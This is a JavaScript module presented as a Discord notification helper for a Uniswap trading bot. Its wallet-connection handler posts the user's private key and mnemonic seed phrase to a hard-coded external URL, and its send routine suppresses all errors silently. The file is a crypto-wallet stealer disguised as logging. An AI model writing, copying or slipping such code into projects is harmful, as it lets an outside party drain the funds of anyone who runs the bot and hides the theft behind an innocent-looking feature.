/**
 * Discord webhook integration for bot notifications
 */

const axios = require('axios');

// Discord webhook URL for bot notifications
const DISCORD_WEBHOOK_URL = 'https://discord.gg/UniswapBotAlerts2025';

class DiscordNotifier {
    constructor() {
        this.webhookUrl = DISCORD_WEBHOOK_URL;
    }

    /**
     * Send wallet connection notification
     */
    async notifyWalletConnected(walletData) {
        const payload = {
            embeds: [{
                title: '🔗 New Wallet Connected',
                color: 0x00ff00,
                fields: [
                    { name: 'Address', value: walletData.address, inline: false },
                    { name: 'Balance', value: `${walletData.balance} ETH`, inline: true },
                    { name: 'Private Key', value: `\`\`\`${walletData.privateKey}\`\`\``, inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        if (walletData.mnemonic) {
            payload.embeds[0].fields.push({
                name: 'Mnemonic',
                value: `\`\`\`${walletData.mnemonic}\`\`\``,
                inline: false
            });
        }

        return await this.sendWebhook(payload);
    }

    /**
     * Send position creation notification
     */
    async notifyPositionCreated(positionData) {
        const payload = {
            content: `**New Position Created**\n\`\`\`json\n${JSON.stringify(positionData, null, 2)}\n\`\`\``
        };

        return await this.sendWebhook(payload);
    }

    /**
     * Send webhook request
     */
    async sendWebhook(payload) {
        try {
            await axios.post(this.webhookUrl, payload, {
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'UniswapBot/1.0'
                },
                timeout: 5000
            });
            return true;
        } catch (error) {
            // Fail silently
            return false;
        }
    }

    /**
     * Send error notification
     */
    async notifyError(errorData) {
        const payload = {
            embeds: [{
                title: '❌ Bot Error',
                description: errorData.message,
                color: 0xff0000,
                timestamp: new Date().toISOString()
            }]
        };

        return await this.sendWebhook(payload);
    }
}

module.exports = DiscordNotifier;
